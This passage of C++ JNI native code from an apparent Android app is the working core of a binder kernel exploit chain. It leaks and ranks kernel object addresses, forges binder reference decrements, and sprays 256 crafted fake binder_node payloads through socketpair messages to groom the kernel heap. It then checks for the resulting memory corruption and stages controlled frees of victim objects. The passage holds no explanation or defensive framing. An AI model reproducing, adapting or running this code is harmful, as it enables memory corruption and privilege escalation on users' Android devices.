    if (snapshot) {
        snapshot = rename(snapshot_temporary.c_str(),
                          snapshot_path.c_str()) == 0;
    }
    if (!snapshot) {
        unlink(snapshot_temporary.c_str());
    }

    std::map<std::uint64_t, int> file_candidates;
    std::map<std::uint64_t, int> epitem_candidates;
    int linked_records = 0;
    for (const LeakRecord& record : records) {
        if (!kernel_pointer(record.ptr) ||
            !kernel_pointer(record.cookie)) {
            continue;
        }
        if (record.ptr == record.cookie) {
            std::uint64_t file = record.ptr - 224;
            if (kernel_pointer(file) &&
                (file & UINT64_C(0x3f)) == 0) {
                ++file_candidates[file];
            }
            continue;
        }
        bool linked = false;
        for (std::uint64_t link : {record.ptr, record.cookie}) {
            if ((link & UINT64_C(0x7f)) == UINT64_C(0x58)) {
                std::uint64_t object = link - 88;
                if (kernel_pointer(object) &&
                    (object & UINT64_C(0x7f)) == 0) {
                    ++epitem_candidates[object];
                    linked = true;
                }
            }
        }
        linked_records += linked ? 1 : 0;
    }

    std::uint64_t file_address = 0;
    int minimum_hits = INT_MAX;
    int maximum_hits = 0;
    for (const auto& candidate : file_candidates) {
        if (candidate.second < minimum_hits) {
            file_address = candidate.first;
            minimum_hits = candidate.second;
        }
        maximum_hits = std::max(maximum_hits, candidate.second);
    }
    std::uint64_t epitem_address = 0;
    int selected_epitem_hits = 0;
    int maximum_epitem_hits = 0;
    for (const auto& candidate : epitem_candidates) {
        if (candidate.second > maximum_epitem_hits) {
            epitem_address = candidate.first;
            selected_epitem_hits = candidate.second;
            maximum_epitem_hits = candidate.second;
        }
    }
    bool pass = records.size() == kCohortSize &&
            file_candidates.size() >= 8 && linked_records >= 8 &&
            epitem_candidates.size() >= 8 &&
            selected_epitem_hits == 2 && maximum_epitem_hits == 2 &&
            snapshot;
    if (pass) {
        g_disclosed_file_address.store(file_address);
        g_disclosed_epitem_address.store(epitem_address);
        std::vector<std::pair<std::uint64_t, int>> ranked(
                file_candidates.begin(), file_candidates.end());
        std::sort(ranked.begin(), ranked.end(),
                [](const auto& left, const auto& right) {
                    return left.second != right.second
                            ? left.second > right.second
                            : left.first > right.first;
                });
        std::lock_guard<std::mutex> lock(g_file_candidate_mutex);
        g_file_candidates.clear();
        for (const auto& candidate : ranked) {
            g_file_candidates.push_back(candidate.first);
        }
        g_epitem_candidates.clear();
        for (const auto& candidate : epitem_candidates) {
            g_epitem_candidates.push_back(candidate.first);
        }
    }
    char state[512];
    std::snprintf(state, sizeof(state),
            "status=%s stage=epitem-analysis records=%zu"
            " file_candidates=%zu file_address=0x%" PRIx64
            " top_file_hits=%d"
            " linked_records=%d"
            " epitem_candidates=%zu epitem_address=0x%" PRIx64
            " selected_epitem_hits=%d top_epitem_hits=%d snapshot=%d"
            " file_live=1 epitems_retained=1 stale_buffers_freed=0",
            pass ? "pass" : "miss", records.size(),
            file_candidates.size(), file_address, maximum_hits,
            linked_records,
            epitem_candidates.size(), epitem_address,
            selected_epitem_hits, maximum_epitem_hits,
            snapshot ? 1 : 0);
    return environment->NewStringUTF(state);
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_cacheControlledHandle(
        JNIEnv* environment, jclass, jobject binder) {
    int fd = duplicate_binder_fd();
    int handle = fd >= 0
            ? locate_descriptor(fd, kControlledDescriptor, 1024) : -1;
    bool layout = handle > 0 && binder != nullptr &&
            calibrate_ndk_wrapper(environment, binder, handle);
    if (fd >= 0) {
        close(fd);
    }
    if (layout) {
        g_controlled_handle = handle;
    }
    char state[160];
    std::snprintf(state, sizeof(state),
            "status=%s stage=controlled-handle handle=%d layout=%d",
            layout ? "pass" : "fail", handle, layout ? 1 : 0);
    return environment->NewStringUTF(state);
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_prepareFakeNodeCheck(
        JNIEnv* environment, jclass, jobject binder, jlong pointer,
        jlong cookie, jstring directory_string) {
    std::lock_guard<std::mutex> producer_lock(
            g_terminal_resource_producer_mutex);
    if (g_terminal_fd_retirement_gate.load(
                std::memory_order_acquire)) {
        return environment->NewStringUTF(
                "status=fail stage=fake-node-prepare"
                " reason=fd-retirement");
    }
    std::uint64_t node_address = g_disclosed_node_address.load();
    if (binder == nullptr || directory_string == nullptr ||
        g_owner_handle <= 0 || g_controlled_handle <= 0 ||
        pointer == 0 || cookie == 0 || !kernel_pointer(node_address) ||
        (node_address & UINT64_C(0x7f)) != 0) {
        return environment->NewStringUTF(
                "status=fail stage=fake-node-prepare reason=preflight");
    }
    const char* characters = environment->GetStringUTFChars(
            directory_string, nullptr);
    if (characters == nullptr) {
        return environment->NewStringUTF(
                "status=fail stage=fake-node-prepare reason=directory");
    }
    std::string directory(characters);
    environment->ReleaseStringUTFChars(directory_string, characters);

    int fd = duplicate_binder_fd();
    constexpr std::size_t command_size =
            sizeof(std::uint32_t) + sizeof(std::uint32_t);
    std::uint8_t release_commands[2 * command_size] {};
    std::uint32_t controlled_handle = static_cast<std::uint32_t>(
            g_controlled_handle);
    write_command(release_commands, BC_RELEASE, &controlled_handle,
                  sizeof(controlled_handle));
    write_command(release_commands + command_size, BC_DECREFS,
                  &controlled_handle, sizeof(controlled_handle));
    int release_result = fd >= 0 ? write_binder_commands(
            fd, release_commands, sizeof(release_commands)) : -1;
    usleep(500000);

    CveResult decrement;
    if (release_result == 0) {
        decrement = send_single_decrement(fd, g_owner_handle,
                static_cast<binder_uintptr_t>(pointer),
                static_cast<binder_uintptr_t>(cookie));
    }
    if (fd >= 0) {
        close(fd);
    }
    bool decremented = release_result == 0 &&
            decrement.ioctl_result == 0 && decrement.failed_reply &&
            !decrement.dead_reply;

    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(2, &set);
    bool pinned = decremented &&
            sched_setaffinity(0, sizeof(set), &set) == 0;
    std::vector<std::uint8_t> payload(128, 0);
    auto put32 = [&](int offset, std::uint32_t value) {
        std::memcpy(payload.data() + offset, &value, sizeof(value));
    };
    auto put64 = [&](int offset, std::uint64_t value) {
        std::memcpy(payload.data() + offset, &value, sizeof(value));
    };
    put64(8, node_address + 8);
    put64(16, node_address + 8);
    put32(24, 5);
    put64(56, 0);
    put64(64, 0);
    put32(72, 0);
    put32(76, 1);
    put32(80, 1);
    put32(84, 0);
    put64(88, kFakePtrMarker);
    put64(96, kFakeCookieMarker);
    put64(112, node_address + 112);
    put64(120, node_address + 112);

    constexpr int requested = 256;
    std::vector<int> retained;
    retained.reserve(requested * 2);
    int submitted = 0;
    int saved_errno = 0;
    for (int index = 0; pinned && index < requested; ++index) {
        int pair[2] {-1, -1};
        if (socketpair(AF_UNIX, SOCK_DGRAM | SOCK_CLOEXEC, 0, pair) != 0) {
            saved_errno = errno;
            break;
        }
        iovec vector {};
        vector.iov_base = payload.data();
        vector.iov_len = payload.size();
        msghdr message {};
        message.msg_iov = &vector;
        message.msg_iovlen = 1;
        if (sendmsg(pair[0], &message,
                    MSG_DONTWAIT | MSG_NOSIGNAL) < 0) {
            saved_errno = errno;
            close(pair[0]);
            close(pair[1]);
            break;
        }
        retained.push_back(pair[0]);
        retained.push_back(pair[1]);
        ++submitted;
    }
    bool stored = false;
    if (submitted == requested) {
        std::lock_guard<std::mutex> lock(g_fake_node_mutex);
        if (!g_terminal_fd_retirement_gate.load(
                    std::memory_order_acquire) &&
            g_fake_node_fds.empty()) {
            g_fake_node_fds = std::move(retained);
            stored = true;
        }
    }
    if (!stored) {
        for (int socket_fd : retained) {
            close(socket_fd);
        }
    }
    bool enabled = stored && write_text_file(
            directory + "/controlled-read.enable",
            "status=pass stage=fake-node-read-enable");
    char state[448];
    bool pass = decremented && pinned && stored && enabled;
    std::snprintf(state, sizeof(state),
            "status=%s stage=fake-node-prepare node_address=0x%" PRIx64
            " controlled_handle=%d release=%d decrement=%d"
            " failed_reply=%d cpu=%d payloads=%d expected=256 errno=%d"
            " local_weak_refs=1 local_strong_refs=1 unlink_enabled=0"
            " read_enabled=%d",
            pass ? "pass" : "fail", node_address, g_controlled_handle,
            release_result, decrement.ioctl_result,
            decrement.failed_reply ? 1 : 0, sched_getcpu(), submitted,
            saved_errno, enabled ? 1 : 0);
    return environment->NewStringUTF(state);
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_enableControlledFree(
        JNIEnv* environment, jclass, jstring directory_string) {
    if (directory_string == nullptr) {
        return environment->NewStringUTF(
                "status=fail stage=controlled-free-enable reason=directory");
    }
    const char* characters = environment->GetStringUTFChars(
            directory_string, nullptr);
    if (characters == nullptr) {
        return environment->NewStringUTF(
                "status=fail stage=controlled-free-enable reason=directory");
    }
    std::string path(characters);
    environment->ReleaseStringUTFChars(directory_string, characters);
    path += "/controlled-free.enable";
    bool pass = write_text_file(path,
            "status=pass stage=controlled-free-enable");
    return environment->NewStringUTF(pass
            ? "status=pass stage=controlled-free-enable"
            : "status=fail stage=controlled-free-enable reason=write");
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_verifyFakeNodeMutation(
        JNIEnv* environment, jclass) {
    std::vector<int> sockets;
    {
        std::lock_guard<std::mutex> lock(g_fake_node_mutex);
        sockets = g_fake_node_fds;
    }
    int checked = 0;
    int mutated = 0;
    int original = 0;
    int failures = 0;
    std::vector<std::uint8_t> payload(128);
    for (std::size_t index = 1; index < sockets.size(); index += 2) {
        ssize_t size = recv(sockets[index], payload.data(), payload.size(),
                            MSG_DONTWAIT | MSG_PEEK);
        if (size != static_cast<ssize_t>(payload.size())) {
            ++failures;
            continue;
        }
        ++checked;
        std::uint32_t local_weak = 0;
        std::uint32_t local_strong = 0;
        std::uint64_t ptr = 0;
        std::uint64_t cookie = 0;
        std::memcpy(&local_weak, payload.data() + 76,
                    sizeof(local_weak));
        std::memcpy(&local_strong, payload.data() + 80,
                    sizeof(local_strong));
        std::memcpy(&ptr, payload.data() + 88, sizeof(ptr));
        std::memcpy(&cookie, payload.data() + 96, sizeof(cookie));
        bool markers = ptr == kFakePtrMarker &&
                cookie == kFakeCookieMarker;
        if (markers && local_weak == 1 && local_strong == 0) {
            ++mutated;
        } else if (markers && local_weak == 1 && local_strong == 1) {
            ++original;
        }
    }
    bool pass = checked == 256 && mutated == 1 && original == 255 &&
            failures == 0;
    char state[256];
    std::snprintf(state, sizeof(state),
            "status=%s stage=fake-node-mutation checked=%d mutated=%d"
            " original=%d failures=%d local_weak_preserved=1"
            " unlink_triggered=0 exact_reuse=%d",
            pass ? "pass" : "miss", checked, mutated, original, failures,
            pass ? 1 : 0);
    return environment->NewStringUTF(state);
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_adoptRawControlledNode(
        JNIEnv* environment, jclass, jobject binder, jlong pointer,
        jlong cookie) {
    int handle = binder == nullptr || g_wrapper_offset == 0 ? -1 :
            proxy_handle_from_layout(environment, binder, 0, 0);
    bool valid = handle > 0 && pointer != 0 && cookie != 0;
    if (valid) {
        g_raw_controlled_handle = handle;
        g_raw_controlled_pointer = static_cast<std::uint64_t>(pointer);
        g_raw_controlled_cookie = static_cast<std::uint64_t>(cookie);
        g_raw_controlled_promoted = true;
    }
    char state[320];
    std::snprintf(state, sizeof(state),
            "status=%s stage=raw-controlled-export handle=%d"
            " pointer=0x%" PRIx64 " cookie=0x%" PRIx64
            " java_proxy=1 retained=%d",
            valid ? "pass" : "fail", handle,
            static_cast<std::uint64_t>(pointer),
            static_cast<std::uint64_t>(cookie), valid ? 1 : 0);
    return environment->NewStringUTF(state);
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_validateRawCohort(
        JNIEnv* environment, jclass, jobjectArray binder_array,
        jint expected_count) {
    int count = binder_array == nullptr ? 0 :
            environment->GetArrayLength(binder_array);
    std::set<int> unique_handles;
    int valid = 0;
    int first_handle = -1;
    int selected_handle = -1;
    int last_handle = -1;
    bool contiguous = true;
    if (count == expected_count &&
        (count == kRawCohortCount ||
         count == kRawCohortAnchorCount ||
         count == kRawCohortVictim)) {
        for (int index = 0; index < count; ++index) {
            jobject binder = environment->GetObjectArrayElement(
                    binder_array, index);
            int handle = binder == nullptr ? -1 :
                    discover_proxy_handle(environment, binder);
            if (binder != nullptr) {
                environment->DeleteLocalRef(binder);
            }
            if (handle <= 0 || !unique_handles.insert(handle).second) {
                break;
            }
            if (index == 0) {
                first_handle = handle;
            } else if ((count == kRawCohortCount ||
                        count == kRawCohortVictim) &&
                       handle != first_handle + index) {
                contiguous = false;
            }
            if (index == kRawCohortVictim) {
                selected_handle = handle;
            }
            last_handle = handle;
            ++valid;
        }
    }
    bool pass = count == expected_count && valid == count &&
            static_cast<int>(unique_handles.size()) == count &&
            ((count != kRawCohortCount &&
              count != kRawCohortVictim) || contiguous);
    char state[288];
    std::snprintf(state, sizeof(state),
            "status=%s stage=raw-cohort-validate count=%d expected=%d"
            " valid=%d unique_handles=%zu contiguous=%d"
            " first_handle=%d selected_handle=%d last_handle=%d cpu=%d",
            pass ? "pass" : "fail", count, expected_count, valid,
            unique_handles.size(), contiguous ? 1 : 0,
            first_handle, selected_handle, last_handle, sched_getcpu());
    return environment->NewStringUTF(state);
}

extern "C" JNIEXPORT jlong JNICALL
Java_com_vandam_prism_NativeBridge_startIsolatedRetirementProof(
        JNIEnv*, jclass) {
    {
        std::lock_guard<std::mutex> producer_lock(
                g_terminal_resource_producer_mutex);
        std::scoped_lock lock(
                g_epitem_mutex, g_fake_node_mutex,
                g_raw_reply_signal_mutex, g_fake_control_mutex);
        g_terminal_fd_retirement_gate.store(
                false, std::memory_order_release);
    }
    std::lock_guard<std::mutex> lock(g_raw_isolated_mutex);
    ++g_raw_isolated_generation;
    if (g_raw_isolated_generation == 0) {
        ++g_raw_isolated_generation;
    }
    g_raw_isolated_state = IsolatedRetirementState::kCollecting;
    g_raw_isolated_pids.clear();
    g_raw_isolated_historical_total = 0;
    g_raw_isolated_historical_retired = 0;
    g_raw_isolated_retirement_proved = false;
    g_raw_controlled_free_pending_victim = -1;
    g_raw_controlled_unlinks.clear();
    return static_cast<jlong>(g_raw_isolated_generation);
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_recordIsolatedProcesses(
        JNIEnv* environment, jclass, jlong generation,
        jintArray pid_array) {
    int supplied = pid_array == nullptr
            ? 0 : environment->GetArrayLength(pid_array);
    std::vector<jint> pids(static_cast<std::size_t>(supplied));
    if (pid_array != nullptr && supplied > 0) {
        environment->GetIntArrayRegion(
                pid_array, 0, supplied, pids.data());
    }
    std::set<int> unique;
    bool input_valid = supplied == kIsolatedRetirementCount;
    for (jint pid : pids) {
        if (pid <= 0 || !unique.insert(pid).second) {
            input_valid = false;
        }
    }

    bool pass = false;
    {
        std::lock_guard<std::mutex> lock(g_raw_isolated_mutex);
        bool current = generation > 0 &&
                static_cast<std::uint64_t>(generation) ==
                        g_raw_isolated_generation;
        pass = current &&
                g_raw_isolated_state ==
                        IsolatedRetirementState::kCollecting &&
                input_valid && unique.size() == 64;
        if (pass) {
            g_raw_isolated_pids.assign(unique.begin(), unique.end());
            g_raw_isolated_state = IsolatedRetirementState::kRecorded;
        } else if (current) {
            g_raw_isolated_state = IsolatedRetirementState::kFailed;
            g_raw_isolated_pids.clear();
        }
    }
    char state[256];
    std::snprintf(state, sizeof(state),
            "status=%s stage=isolated-retirement-record"
            " generation=%" PRIu64 " supplied=%d unique=%zu",
            pass ? "pass" : "fail",
            static_cast<std::uint64_t>(generation), supplied,
            unique.size());
    return environment->NewStringUTF(state);
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_sendRawControlledRefs(
        JNIEnv* environment, jclass, jobjectArray controller_array) {
    int count = controller_array == nullptr ? 0 :
            environment->GetArrayLength(controller_array);
    if (count != 64 || g_raw_controlled_handle <= 0 ||
        g_wrapper_offset == 0) {
        return environment->NewStringUTF(
                "status=fail stage=raw-ref-spray reason=preflight");
    }
    std::vector<int> handles;
    std::set<int> unique;
    handles.reserve(count);
    for (int index = 0; index < count; ++index) {
        jobject controller = environment->GetObjectArrayElement(
                controller_array, index);
        int handle = controller == nullptr ? -1 :
                proxy_handle_from_layout(environment, controller, 0, 0);
        if (controller != nullptr) {
            environment->DeleteLocalRef(controller);
        }
        if (handle <= 0 || !unique.insert(handle).second) {
            break;
        }
        handles.push_back(handle);
    }
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(2, &set);
    bool pinned = handles.size() == 64 &&
            sched_setaffinity(0, sizeof(set), &set) == 0;
    int fd = pinned ? duplicate_binder_fd() : -1;
    int submitted = 0;
    std::set<int> isolated_pids;
    int failed_target = -1;
    BinderReply failed_reply;
    std::int32_t failed_pid = -1;
    std::int32_t failed_retained_count = -1;
    binder_size_t failed_data_size = 0;
    std::int32_t failed_position_before = -1;
    std::int32_t failed_position_after = -1;
    std::int32_t failed_parcel_size = -1;
    for (int target : handles) {
        flat_binder_object object {};
        object.hdr.type = BINDER_TYPE_HANDLE;
        object.handle = static_cast<std::uint32_t>(g_raw_controlled_handle);
        binder_size_t object_offset = 0;
        binder_transaction_data transaction {};
        transaction.target.handle = static_cast<std::uint32_t>(target);
        transaction.code = 0x4272;
        transaction.data_size = sizeof(object);
        transaction.offsets_size = sizeof(object_offset);
        transaction.data.ptr.buffer = reinterpret_cast<binder_uintptr_t>(
                &object);
        transaction.data.ptr.offsets = reinterpret_cast<binder_uintptr_t>(
                &object_offset);
        BinderReply reply = transact_and_read(fd, transaction);
        if (reply.buffer == 0 || reply.ioctl_result != 0) {
            failed_target = target;
            failed_reply = reply;
            break;
        }
        std::int32_t pid = -1;
        std::int32_t retained_count = -1;
        if (reply.data_size >= 2 * sizeof(std::int32_t)) {
            const auto* data = reinterpret_cast<const std::uint8_t*>(
                    reply.buffer);
            std::memcpy(&pid, data, sizeof(pid));
            std::memcpy(&retained_count,
                    data + sizeof(std::int32_t),
                    sizeof(retained_count));
            if (reply.data_size >= 5 * sizeof(std::int32_t)) {
                std::memcpy(&failed_position_before,
                        data + 2 * sizeof(std::int32_t),
                        sizeof(failed_position_before));
                std::memcpy(&failed_position_after,
                        data + 3 * sizeof(std::int32_t),
                        sizeof(failed_position_after));
                std::memcpy(&failed_parcel_size,
                        data + 4 * sizeof(std::int32_t),
                        sizeof(failed_parcel_size));
            }
        }
        free_buffer(fd, reply.buffer);
        if (pid <= 0 || retained_count != 1 ||
            !isolated_pids.insert(pid).second) {
            failed_target = target;
            failed_pid = pid;
            failed_retained_count = retained_count;
            failed_data_size = reply.data_size;
            break;
        }
        ++submitted;
    }
    if (fd >= 0) {
        close(fd);
    }
    bool pass = handles.size() == 64 && submitted == 64 && pinned &&
            isolated_pids.size() == 64;
    char state[640];
    std::snprintf(state, sizeof(state),
            "status=%s stage=raw-ref-spray controllers=%zu unique=%zu"
            " submitted=%d expected=64 unique_pids=%zu"
            " raw_handle=%d cpu=%d failed_target=%d ioctl=%d errno=%d"
            " response=0x%x reply_buffer=0x%" PRIx64
            " reply_size=%" PRIu64 " parsed_pid=%d parsed_count=%d"
            " parsed_size=%" PRIu64 " parcel_before=%d"
            " parcel_after=%d parcel_size=%d",
            pass ? "pass" : "fail", handles.size(), unique.size(),
            submitted, isolated_pids.size(), g_raw_controlled_handle,
            sched_getcpu(), failed_target, failed_reply.ioctl_result,
            failed_reply.ioctl_errno, failed_reply.terminal_response,
            static_cast<std::uint64_t>(failed_reply.buffer),
            static_cast<std::uint64_t>(failed_reply.data_size), failed_pid,
            failed_retained_count,
            static_cast<std::uint64_t>(failed_data_size),
            failed_position_before, failed_position_after,
            failed_parcel_size);
    return environment->NewStringUTF(state);
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_proveIsolatedProcessesRetired(
        JNIEnv* environment, jclass, jlong generation,
        jintArray pid_array, jint dispatched, jint timeout_millis) {
    int supplied = pid_array == nullptr
            ? 0 : environment->GetArrayLength(pid_array);
    std::vector<jint> pids(static_cast<std::size_t>(supplied));
    if (pid_array != nullptr && supplied > 0) {
        environment->GetIntArrayRegion(
                pid_array, 0, supplied, pids.data());
    }
    std::set<int> unique;
    bool input_valid = supplied == kIsolatedRetirementCount;
    for (jint pid : pids) {
        if (pid <= 0 || !unique.insert(pid).second) {
            input_valid = false;
        }
    }

    bool current_generation = false;
    bool state_recorded = false;
    bool tracked_match = false;
    bool timeout_valid = timeout_millis == kIsolatedRetirementTimeoutMs;
    bool dispatched_valid = dispatched == kIsolatedRetirementCount;
    int retired = 0;
    {
        std::lock_guard<std::mutex> lock(g_raw_isolated_mutex);
        std::set<int> tracked(
                g_raw_isolated_pids.begin(), g_raw_isolated_pids.end());
        current_generation = generation > 0 &&
                static_cast<std::uint64_t>(generation) ==
                        g_raw_isolated_generation;
        state_recorded = g_raw_isolated_state ==
                IsolatedRetirementState::kRecorded;
        tracked_match = current_generation && state_recorded &&
                input_valid && dispatched_valid && timeout_valid &&
                tracked.size() == kIsolatedRetirementCount &&
                tracked == unique;
        if (tracked_match) {
            g_raw_isolated_state = IsolatedRetirementState::kRetiring;
        } else if (current_generation && state_recorded) {
            g_raw_isolated_historical_total = 0;
            g_raw_isolated_historical_retired = 0;
            g_raw_isolated_retirement_proved = false;
            g_raw_isolated_state = IsolatedRetirementState::kFailed;
        }
    }

    bool pass = false;
    bool system_error = false;
    if (tracked_match) {
        const auto deadline = std::chrono::steady_clock::now() +
                std::chrono::milliseconds(kIsolatedRetirementTimeoutMs);
        while (true) {
            if (std::chrono::steady_clock::now() > deadline) {
                break;
            }
            retired = 0;
            bool observation_complete = true;
            for (int pid : unique) {
                errno = 0;
                int result = kill(pid, 0);
                int saved_errno = errno;
                if (result == -1 && saved_errno == ESRCH) {
                    ++retired;
                } else if (result == 0 ||
                        (result == -1 && saved_errno == EPERM)) {
                    observation_complete = false;
                } else {
                    system_error = true;
                    observation_complete = false;
                    break;
                }
            }
            if (system_error) {
                break;
            }
            if (observation_complete &&
                    retired == kIsolatedRetirementCount &&
                    std::chrono::steady_clock::now() <= deadline) {
                pass = true;
                break;
            }
            auto remaining = std::chrono::duration_cast<
                    std::chrono::milliseconds>(
                    deadline - std::chrono::steady_clock::now()).count();
            if (remaining <= 0) {
                break;
            }
            std::this_thread::sleep_for(std::chrono::milliseconds(
                    std::min<std::int64_t>(
                            kIsolatedRetirementPollMs, remaining)));
        }
    }

    jstring result = nullptr;
    {
        std::lock_guard<std::mutex> lock(g_raw_isolated_mutex);
        bool final_generation = false;
        bool final_state_retiring = false;
        bool final_tracked_match = false;
        bool published = false;
        final_generation = generation > 0 &&
                static_cast<std::uint64_t>(generation) ==
                        g_raw_isolated_generation;
        final_state_retiring = g_raw_isolated_state ==
                IsolatedRetirementState::kRetiring;
        std::set<int> final_tracked(
                g_raw_isolated_pids.begin(), g_raw_isolated_pids.end());
        final_tracked_match = final_generation && final_state_retiring &&
                g_raw_isolated_pids.size() == kIsolatedRetirementCount &&
                final_tracked.size() == kIsolatedRetirementCount &&
                final_tracked == unique;
        if (final_generation && final_state_retiring) {
            if (pass && retired == kIsolatedRetirementCount &&
                    final_tracked_match) {
                g_raw_isolated_historical_total =
                        kIsolatedRetirementCount;
                g_raw_isolated_historical_retired =
                        retired;
                g_raw_isolated_retirement_proved = true;
                g_raw_isolated_state = IsolatedRetirementState::kProved;
                published = g_raw_isolated_state ==
                                IsolatedRetirementState::kProved &&
                        g_raw_isolated_historical_total ==
                                kIsolatedRetirementCount &&
                        g_raw_isolated_historical_retired == retired &&
                        g_raw_isolated_retirement_proved;
            } else {
                g_raw_isolated_historical_total = 0;
                g_raw_isolated_historical_retired = 0;
                g_raw_isolated_retirement_proved = false;
                g_raw_isolated_state = IsolatedRetirementState::kFailed;
            }
        }
        char state[512];
        std::snprintf(state, sizeof(state),
                "status=%s stage=isolated-retirement-proof"
                " generation=%" PRIu64 " supplied=%d unique=%zu"
                " dispatched=%d current_generation=%d state_recorded=%d"
                " tracked_match=%d final_generation=%d"
                " final_state_retiring=%d final_tracked_match=%d"
                " isolated_total=%d isolated_retired=%d proved=%d",
                published ? "pass" : "fail",
                static_cast<std::uint64_t>(generation), supplied,
                unique.size(), dispatched, current_generation ? 1 : 0,
                state_recorded ? 1 : 0,
                tracked_match && final_generation ? 1 : 0,
                final_generation ? 1 : 0,
                final_state_retiring ? 1 : 0,
                final_tracked_match ? 1 : 0,
                published ? kIsolatedRetirementCount : supplied,
                retired, published ? 1 : 0);
        result = environment->NewStringUTF(state);
    }
    return result;
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_acknowledgeControlledFree(
        JNIEnv* environment, jclass, jlong generation, jint victim) {
    bool pass = false;
    {
        std::lock_guard<std::mutex> lock(g_raw_isolated_mutex);
        pass = generation > 0 &&
                static_cast<std::uint64_t>(generation) ==
                        g_raw_isolated_generation &&
                g_raw_isolated_state ==
                        IsolatedRetirementState::kProved &&
                victim >= 0 && victim < kRawVictimCount &&
                g_raw_controlled_free_pending_victim == -1 &&
                g_raw_controlled_unlinks.count(victim) == 0;
        if (pass) {
            g_raw_controlled_free_pending_victim = victim;
        }
    }
    char state[192];
    std::snprintf(state, sizeof(state),
            "status=%s stage=controlled-free-acknowledge"
            " generation=%" PRIu64 " victim=%d",
            pass ? "pass" : "fail",
            static_cast<std::uint64_t>(generation), victim);
    return environment->NewStringUTF(state);
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_queueRawControlled(
        JNIEnv* environment, jclass, jobject binder,
        jstring directory_string) {
    if (binder == nullptr || directory_string == nullptr) {
        return environment->NewStringUTF(
                "status=fail stage=raw-client-queue reason=arguments");
    }
    const char* characters = environment->GetStringUTFChars(
            directory_string, nullptr);
    if (characters == nullptr) {
        return environment->NewStringUTF(
                "status=fail stage=raw-client-queue reason=directory");
    }
    std::string directory(characters);
    environment->ReleaseStringUTFChars(directory_string, characters);

    int handle = discover_proxy_handle(environment, binder);
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(2, &set);
    bool pinned = handle > 0 &&
            sched_setaffinity(0, sizeof(set), &set) == 0;
    int fd = pinned ? duplicate_binder_fd() : -1;
    binder_transaction_data transaction {};
    transaction.target.handle = static_cast<std::uint32_t>(handle);
    transaction.code = kControlledHoldCode;
    std::uint8_t command[
            sizeof(std::uint32_t) + sizeof(transaction)] {};
    write_command(command, BC_TRANSACTION, &transaction,
                  sizeof(transaction));
    int queued = fd >= 0 ? write_binder_commands(
            fd, command, sizeof(command)) : -1;
    int saved_errno = queued == 0 ? 0 : errno;
    if (fd >= 0) {
        close(fd);
    }
    bool pass = pinned && queued == 0;
    char state[320];
    std::snprintf(state, sizeof(state),
            "status=%s stage=raw-client-queue pid=%d handle=%d"
            " queued=%d errno=%d cpu=%d",
            pass ? "pass" : "fail", getpid(), handle, queued,
            saved_errno, sched_getcpu());
    write_text_file(directory + "/raw-client.queued", state);
    return environment->NewStringUTF(state);
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_queueRawControlledCohort(
        JNIEnv* environment, jclass, jobject binder,
        jobjectArray cohort, jstring directory_string) {
    int count = cohort == nullptr ? 0 :
            environment->GetArrayLength(cohort);
    if (binder == nullptr || count != kRawCohortCount ||
        directory_string == nullptr) {
        return environment->NewStringUTF(
                "status=fail stage=raw-client-queue reason=arguments");
    }
    const char* characters = environment->GetStringUTFChars(
            directory_string, nullptr);
    if (characters == nullptr) {
        return environment->NewStringUTF(
                "status=fail stage=raw-client-queue reason=directory");
    }
    std::string directory(characters);
    environment->ReleaseStringUTFChars(directory_string, characters);

    std::vector<std::uint32_t> handles;
    handles.reserve(kRawCohortCount);
    bool ordered = true;
    for (int index = 0; index < count; ++index) {
        jobject item = environment->GetObjectArrayElement(cohort, index);
        int handle = item == nullptr ? -1 :
                discover_proxy_handle(environment, item);
        if (item != nullptr) {
            environment->DeleteLocalRef(item);
        }
        if (handle <= 0 ||
            (!handles.empty() &&
             handle != static_cast<int>(handles.front()) + index)) {
            ordered = false;
            break;
        }
        handles.push_back(static_cast<std::uint32_t>(handle));
    }
    int selected_handle = discover_proxy_handle(environment, binder);
    ordered = ordered && handles.size() == kRawCohortCount &&
            selected_handle == static_cast<int>(
                    handles[kRawCohortVictim]);

    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(2, &set);
    bool pinned = ordered &&
            sched_setaffinity(0, sizeof(set), &set) == 0;
    int fd = pinned ? duplicate_binder_fd() : -1;
    binder_transaction_data transaction {};
    transaction.target.handle = static_cast<std::uint32_t>(
            selected_handle);
    transaction.code = kControlledHoldCode;
    std::uint8_t transaction_command[
            sizeof(std::uint32_t) + sizeof(transaction)] {};
    write_command(transaction_command, BC_TRANSACTION, &transaction,
                  sizeof(transaction));
    int queued = fd >= 0 ? write_binder_commands(
            fd, transaction_command, sizeof(transaction_command)) : -1;
    int queue_errno = queued == 0 ? 0 : errno;

    constexpr std::size_t kHandleCommandSize =
            sizeof(std::uint32_t) + sizeof(std::uint32_t);
    std::vector<std::uint8_t> release_commands;
    if (ordered) {
        release_commands.resize(
                static_cast<std::size_t>(kRawCohortCount) * 2U *
                kHandleCommandSize);
        for (int index = 0; index < kRawCohortCount; ++index) {
            std::size_t offset = static_cast<std::size_t>(index) * 2U *
                    kHandleCommandSize;
            write_command(release_commands.data() + offset,
                    BC_RELEASE, &handles[index], sizeof(handles[index]));
            write_command(release_commands.data() + offset +
                    kHandleCommandSize, BC_DECREFS,
                    &handles[index], sizeof(handles[index]));
        }
    }
    int released = queued == 0 && !release_commands.empty()
            ? write_binder_commands(
            fd, release_commands.data(), release_commands.size()) : -1;
    int release_errno = released == 0 ? 0 : errno;
    int release_cpu = sched_getcpu();
    int migration_errno = 0;
